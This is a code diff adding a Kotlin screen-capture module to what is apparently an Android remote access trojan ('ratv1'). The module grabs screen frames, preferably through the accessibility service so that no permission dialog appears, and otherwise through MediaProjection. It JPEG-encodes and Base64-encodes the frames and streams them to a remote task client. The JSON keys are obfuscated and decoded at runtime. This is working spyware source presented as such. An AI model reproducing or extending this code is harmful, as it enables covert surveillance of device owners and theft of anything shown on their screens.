@@ -1,0 +1,227 @@
+package com.remote.ratv1.modules
+
+import android.content.Context
+import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.os.Handler
+import android.os.HandlerThread
+import android.util.Base64
+import android.util.DisplayMetrics
+import android.view.WindowManager
+import com.remote.ratv1.AccessService
+import com.remote.ratv1.SyncAdapter
+import com.remote.ratv1.Crypt
+import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.LinkedBlockingQueue
+import java.util.concurrent.TimeUnit
+
+class DisplayHelper(private val context: Context) {
+
+    companion object {
+        @Volatile var projection: MediaProjection? = null
+        var resultCode: Int = 0
+        var resultData: Intent? = null
+
+        @Volatile private var vdThread: HandlerThread? = null
+        @Volatile private var vdHandler: Handler? = null
+        @Volatile private var imgReader: ImageReader? = null
+        @Volatile private var virtDisplay: VirtualDisplay? = null
+        @Volatile var capWidth = 0
+        @Volatile var capHeight = 0
+        @Volatile private var capturing = false
+        private val frameQ = LinkedBlockingQueue<ByteArray>(3)
+        @Volatile private var lastFrame: ByteArray? = null
+
+        var lastSetupError: String = ""
+
+        @Synchronized
+        fun setupCapture(proj: MediaProjection, metrics: DisplayMetrics) {
+            lastSetupError = ""
+            teardown()
+            val w = metrics.widthPixels / 2
+            val h = metrics.heightPixels / 2
+            val dpi = metrics.densityDpi
+            lastSetupError = "dims=${w}x${h} dpi=$dpi"
+
+            val t = HandlerThread("sk_c").apply { start() }
+            val h2 = Handler(t.looper)
+
+            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+            reader.setOnImageAvailableListener({ r ->
+                if (!capturing) {
+                    r.acquireLatestImage()?.close()
+                    return@setOnImageAvailableListener
+                }
+                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                try {
+                    val planes = img.planes
+                    val buf = planes[0].buffer
+                    val ps = planes[0].pixelStride
+                    val rs = planes[0].rowStride
+                    // rs/ps gives the actual stride width — handles Samsung row alignment padding
+                    val bmpW = rs / ps
+                    val bmp = Bitmap.createBitmap(bmpW, h, Bitmap.Config.ARGB_8888)
+                    bmp.copyPixelsFromBuffer(buf)
+                    val crop = if (bmpW > w) {
+                        Bitmap.createBitmap(bmp, 0, 0, w, h).also { bmp.recycle() }
+                    } else bmp
+                    val baos = ByteArrayOutputStream()
+                    crop.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+                    crop.recycle()
+                    val bytes = baos.toByteArray()
+                    lastFrame = bytes
+                    frameQ.offer(bytes)
+                } finally {
+                    img.close()
+                }
+            }, h2)
+
+            val vd = try {
+                proj.createVirtualDisplay(
+                    "sk_vd", w, h, dpi,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    reader.surface, null, h2
+                )
+            } catch (e: Exception) {
+                lastSetupError = "vd_ex: ${e.javaClass.simpleName}: ${e.message}"
+                reader.close(); t.quitSafely(); return
+            }
+
+            if (vd == null) {
+                lastSetupError = "vd_null w=$w h=$h dpi=$dpi"
+                reader.close(); t.quitSafely(); return
+            }
+
+            proj.registerCallback(object : MediaProjection.Callback() {
+                override fun onStop() {
+                    android.util.Log.e("SK_MP", "onStop fired -- tearing down projection")
+                    teardown()
+                }
+            }, h2)
+
+            vdThread = t
+            vdHandler = h2
+            imgReader = reader
+            virtDisplay = vd
+            projection = proj
+            capWidth = w
+            capHeight = h
+            lastSetupError = "ok"
+        }
+
+        @Synchronized
+        fun teardown() {
+            capturing = false
+            frameQ.clear()
+            virtDisplay?.release()
+            virtDisplay = null
+            imgReader?.close()
+            imgReader = null
+            vdThread?.quitSafely()
+            vdThread = null
+            vdHandler = null
+            projection = null
+        }
+
+        fun isReady() = projection != null && virtDisplay != null
+    }
+
+    private fun k(e: String) = Crypt.d(e)
+
+    private fun getMetrics(): DisplayMetrics {
+        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+        val metrics = DisplayMetrics()
+        @Suppress("DEPRECATION")
+        wm.defaultDisplay.getRealMetrics(metrics)
+        return metrics
+    }
+
+    fun capture(): JSONObject {
+        // Try AccessibilityService first — no grant dialog required (API 31+)
+        val accBytes = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+            AccessService.captureFrame() else null
+        if (accBytes != null) {
+            return JSONObject().apply {
+                put(k("KS89KSss"), "captured")
+                put("source", "accessibility")
+                put(k("KTImOA=="), accBytes.size)
+                put(k("PjooPA=="), Base64.encodeToString(accBytes, Base64.NO_WRAP))
+            }
+        }
+
+        // Fall back to MediaProjection
+        if (!isReady()) return JSONObject().apply {
+            put(k("PykuMiw="), "grant_required")
+            put(k("NDQoOA=="), "send 'screen_grant' to trigger permission dialog")
+        }
+        frameQ.clear()
+        capturing = true
+        val bytes = frameQ.poll(2, TimeUnit.SECONDS) ?: lastFrame
+        capturing = false
+        return if (bytes != null) {
+            JSONObject().apply {
+                put(k("KS89KSss"), "captured")
+                put("source", "mediaprojection")
+                put(k("KTImOA=="), bytes.size)
+                put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
+            }
+        } else {
+            JSONObject().put(k("PykuMiw="), "capture_timeout")
+        }
+    }
+
+    fun stream(client: SyncAdapter, taskId: String, intervalMs: Int, frameCount: Int): JSONObject {
+        val useAcc = AccessService.isAvailable() && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S
+        if (!useAcc && !isReady()) return JSONObject().apply {
+            put(k("PykuMiw="), "grant_required")
+        }
+        var sent = 0
+        var accFailed = false  // set true on first null from captureFrame() to switch path
+        for (i in 0 until frameCount) {
+            // Try accessibility first; on first null switch to MediaProjection for this frame too
+            var bytes: ByteArray? = null
+            if (useAcc && !accFailed) {
+                @androidx.annotation.RequiresApi(android.os.Build.VERSION_CODES.S)
+                fun cap() = AccessService.captureFrame()
+                bytes = cap()
+                if (bytes == null) accFailed = true  // Samsung stripped capability -- fall to MP
+            }
+            if (bytes == null) {
+                // MediaProjection path (also used when acc returns null)
+                if (!isReady()) break
+                frameQ.clear()
+                capturing = true
+                // Poll up to 2s for a fresh frame; fall back to cached last frame
+                // (Samsung VirtualDisplay only pushes new frames when screen content changes)
+                bytes = frameQ.poll(2, TimeUnit.SECONDS) ?: lastFrame
+                capturing = false
+            }
+            if (bytes != null) {
+                try {
+                    client.sendResult(taskId, JSONObject().apply {
+                        put("frame", i)
+                        put("total", frameCount)
+                        put("source", if (useAcc) "accessibility" else "mediaprojection")
+                        put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
+                        put(k("KTImOA=="), bytes.size)
+                    })
+                    sent++
+                } catch (_: Exception) {}
+            }
+            if (i < frameCount - 1) {
+                try { Thread.sleep(intervalMs.toLong()) } catch (_: Exception) { break }
+            }
+        }
+        return JSONObject().apply {
+            put(k("KS89KSss"), "stream_done")
+            put("frames_sent", sent)
+            put("frames_requested", frameCount)
+        }
+    }
+}
